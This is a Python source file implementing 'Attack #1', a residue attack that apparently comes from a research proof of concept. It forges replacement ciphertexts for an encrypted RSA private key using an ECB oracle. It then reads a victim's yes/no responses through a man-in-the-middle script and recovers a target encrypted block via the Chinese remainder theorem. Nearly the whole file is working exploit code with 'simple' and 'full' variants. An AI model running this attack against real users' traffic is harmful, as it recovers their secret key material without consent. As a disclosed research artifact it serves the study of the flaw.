# Attack #1

import multiprocessing

import Crypto.Util.number  # PyCryptodome
import sage.all as sage

from attack_utils import *
from mitm_utils import get_two_ecb_blocks, get_one_ecb_block
from victim import Victim

#
# main attack
#

VERSION = 'simple'

class ResidueAttack(Attack):

    def __init__(self, ecbOracle, privk: bytes, targetBlock: bytes, version=VERSION, stats=False):
        """
        Initialise the ResidueAttack, precomputing parts of the overwritten privk.

        :param ecbOracle: external implementation of the ECB oracle
        :param privk: the original ECB ciphertext to be overwritten, only needed for full attack
        :param targetBlock: the original ECB target ciphertext block
        :param version: either 'simple' or 'full'
        """
        print("Initialising attack 1...")
        self.e = PK_EXP
        self.ecbOracle = ecbOracle
        self.privk = privk  # original privk ciphertext
        self.targetBlock = targetBlock  # to recover plaintext of
        self.version = version
        self.stats = stats
        self.isDone = False

        # the primes to use in all queries
        self.primes = sage.primes_first_n(27)[3:]
        self.product = list_product(self.primes)
        assert bitlen(self.product) >= 128
        print("primes =", self.primes)

        # this will be reused by later calls
        zero = long_to_bytes(0, BLOCK_BYTELEN)
        one = long_to_bytes(1, BLOCK_BYTELEN)
        self.zeroBlock, self.oneBlock = get_two_ecb_blocks(self.ecbOracle, zero, one)

        # prepare what can be done
        print("Prepare the common blocks...")
        rest = self.prepareRestBlocks()
        len_p, len_q = self.prepareCommonBlocks()

        print("Prepare blocks of p...")
        p_blocks = self.preparePBlocks(len_p)

        print("Prepare blocks of q...")
        q_blocks = self.prepareQBlocks(len_q)

        print("Construct the ciphertexts...")
        self.cts = dict()

        for r in self.primes:
            self.cts[r] = dict()
            for t in range(r):
                self.cts[r][t] = q_blocks[t] + self.targetBlock + p_blocks[r] + rest

        # set counters
        self.r_count = 0
        self.t_count = dict()

        # store found values
        self.target_mod = []

        print("Attack precomputation done!")

        if self.stats:
            self.victim = Victim()
            self.queue = multiprocessing.Queue()
            self.process = multiprocessing.Process(target=self.victim.run, args=(self.queue,))
            self.process.start()

    def prepareRestBlocks(self):
        """
        Simple version: prepare rest = len(d) || d || len(u) || u, for d = u = 1, block-aligned
        Full version: 
            - prepare ptd = 00 00 00 01 || len(d') || d'[:10], for d' = 2^2047 of length 256B
            - prepare rest = d[10:] || len(u) || u, for original d,u from privk
        """
        if self.version == 'simple':
            enc_d = len_encode(long_to_bytes(1, BYTELEN_D - 2))
            enc_u = len_encode(long_to_bytes(1, BYTELEN_U - 2))
            len_d, len_u = get_two_ecb_blocks(self.ecbOracle, getBlocks(enc_d, 0), getBlocks(enc_u, 0))

            return len_d + self.zeroBlock * (blocklen(enc_d) - 2) + self.oneBlock + len_u + self.zeroBlock * (blocklen(enc_u) - 2) + self.oneBlock
        
        elif self.version == 'full':
            enc_d = len_encode(long_to_bytes(2**2047, BYTELEN_D))
            pt_2 = long_to_bytes(1, 4) + enc_d[0:12]

            return get_one_ecb_block(self.ecbOracle, pt_2) + self.privk[272:]

        else:
            raise NotImplementedError

    def prepareCommonBlocks(self):
        """
        To save on ECB oracle queries, prepare the blocks that are common for all p, q.
        """
        if self.version == 'simple':
            enc_p = len_encode(long_to_bytes(0, BYTELEN_P))
            ptp = enc_p[0:16]

            enc_q = len_encode(long_to_bytes(0, BYTELEN_Q))
            ptq = enc_q[0:16]

            len_p, len_q = get_two_ecb_blocks(self.ecbOracle, ptp, ptq)
            return len_p, len_q
        
        elif self.version == 'full':
            enc_p = len_encode(long_to_bytes(2**1023, BYTELEN_P))
            ptp = long_to_bytes(1, 2) + enc_p[:14]

            enc_q = len_encode(long_to_bytes(2**1023, BYTELEN_Q))
            ptq = enc_q[0:16]

            len_p, len_q = get_two_ecb_blocks(self.ecbOracle, ptp, ptq)
            return len_p, len_q

        else:
            raise NotImplementedError

    def preparePBlocks(self, len_p):
        """
        Simple version: prepare ptp_i = len(p) || p, block-aligned, assuming it covers only 4 non-zero blocks
        Full version: prepare ptp_i = 00 01 || len(p) || p[0:124], for p = 2^1023 + 2^32 * rho + 1, assuming rho needs 1 block
        """
        p_blocks = dict()

        if self.version == 'simple':
            for r in self.primes:
                rest_prime = Crypto.Util.number.getPrime(256)  # prevent false positives by ensuring gcd(p,q) == r
                p = rest_prime * r

                enc_p = len_encode(long_to_bytes(p, BYTELEN_P - 2))
                len_p, p_minus3 = get_two_ecb_blocks(self.ecbOracle, getBlocks(enc_p, 0), getBlocks(enc_p, -3))
                p_minus12 = self.ecbOracle.call(getBlocks(enc_p, -1, 2))

                p_blocks[r] = len_p + self.zeroBlock * (blocklen(enc_p) - 4) + p_minus3 + p_minus12

        elif self.version == 'full':
            # make sure to query only when we have two blocks of plaintext ready
            last_rho = None
            last_p = None
            last_r = None

            for r in self.primes:
                i = 0
                while True:
                    rho = (sage.inverse_mod(2**32, r) * (- 2**1023 - 1)) % r + i * r
                    p = 2**1023 + (2**32) * rho + 1
                    assert p % r == 0
                    if Crypto.Util.number.isPrime(p // r):
                        break
                    i += 1
                
                if last_rho is None:
                    last_rho = rho
                    last_p = p
                    last_r = r
                else:
                    last_enc_rho = long_to_bytes(last_rho, 16)
                    enc_rho = long_to_bytes(rho, 16)
                    
                    last_p_block, p_block = get_two_ecb_blocks(self.ecbOracle, last_enc_rho, enc_rho)

                    p_blocks[last_r] = len_p + self.zeroBlock * 6 + last_p_block
                    p_blocks[r] = len_p + self.zeroBlock * 6 + p_block

                    last_rho = None
                    last_p = None
                    last_r = None

        else:
            raise NotImplementedError
        
        return p_blocks

    def prepareQBlocks(self, len_q):
        """
        Simple version: prepare ptq_t = len(q) || q[0:110], block-aligned, assuming it covers only 2 non-zero blocks
        Full version: prepare ptq_t = len(q) || q[0:110], for q = 2^1023 + 2^(128+16)*t + 1, assuming t needs 1 block
        """
        q_blocks = dict()

        if self.version == 'simple':
            for t in range(self.primes[-1]):
                q = 2**128 * t  # after decryption, this becomes q += self.target
                
                enc_q = len_encode(long_to_bytes(q, BYTELEN_Q - 2))
                len_q, q_minus2 = get_two_ecb_blocks(self.ecbOracle, getBlocks(enc_q, 0), getBlocks(enc_q, -2))

                q_zeros = blocklen(enc_q) - 3  # one less to make space for the target block

                q_blocks[t] = len_q + self.zeroBlock * q_zeros + q_minus2

        elif self.version == 'full':
            last_t = None
            for t in range(self.primes[-1]):
                if last_t is None:
                    last_t = t
                else:
                    last_enc_t = long_to_bytes(last_t, 16)
                    enc_t = long_to_bytes(t, 16)
                    
                    last_q_block, q_block = get_two_ecb_blocks(self.ecbOracle, last_enc_t, enc_t)

                    q_blocks[last_t] = len_q + self.zeroBlock * 5 + last_q_block
                    q_blocks[t] = len_q + self.zeroBlock * 5 + q_block

                    last_t = None

            t = self.primes[-1] - 1  # one odd t will be left
            enc_t = long_to_bytes(t, 16) 
            q_block = get_one_ecb_block(self.ecbOracle, enc_t)
            q_blocks[t] = len_q + self.zeroBlock * 5 + q_block

        else:
            raise NotImplementedError

        return q_blocks

    # the following methods are for the mitm script

    def next_privk(self):
        """
        Iterate over r's and t's one-by-one, producing the next ciphertext to replace the original privk.
        """
        r = self.primes[self.r_count]
        if r not in self.t_count.keys():
            self.t_count[r] = 0
        t = self.t_count[r]

        ciphertext = self.cts[r][t]

        return url_encode(ciphertext).decode("utf-8")

    def mark_hit(self):
        """
        When the oracle returns 'true', save the computed value of the target block mod the small prime r and move to the next prime.
        """
        r = self.primes[self.r_count]
        t = self.t_count[r]
        print("got hit for r = {}, t = {}".format(r, t))

        if self.version == 'simple':
            q = 2**128 * t
            self.target_mod.append((-q) % r)
        elif self.version == 'full':
            q = 2**1023 + (2**(128+16)) * t + 1
            self.target_mod.append((-q * sage.inverse_mod(2**16, r)) % r)
        else:
            raise NotImplementedError

        # move over to the next prime
        self.r_count += 1

        if self.r_count == len(self.primes):
            self.isDone = True

    def mark_continue(self):
        """
        When the oracle returns 'false', continue testing further values of t.
        """
        r = self.primes[self.r_count]
        self.t_count[r] += 1

        assert self.t_count[r] != r  # since we are testing all possible values of t for given r, we expect to get exactly one hit


    def finish(self):
        """
        Conclude the recovery of the target block via CRT.
        """
        print("Attack is finished!")
        recoveredBlock = sage.crt(self.target_mod, self.primes)
        assert recoveredBlock != 0  # this should not happen, only a guard in case there were false positives

        recoveredBytes = long_to_bytes(recoveredBlock, BLOCK_BYTELEN)
        print("recovered block: {}".format(recoveredBytes.hex()))

        assert bitlen(recoveredBlock) <= 128
        assert self.ecbOracle.call(recoveredBytes + recoveredBytes) == self.targetBlock + self.targetBlock  # sanity check

        if self.stats:
            self.queue.put("close")
            self.process.join()

        return recoveredBytes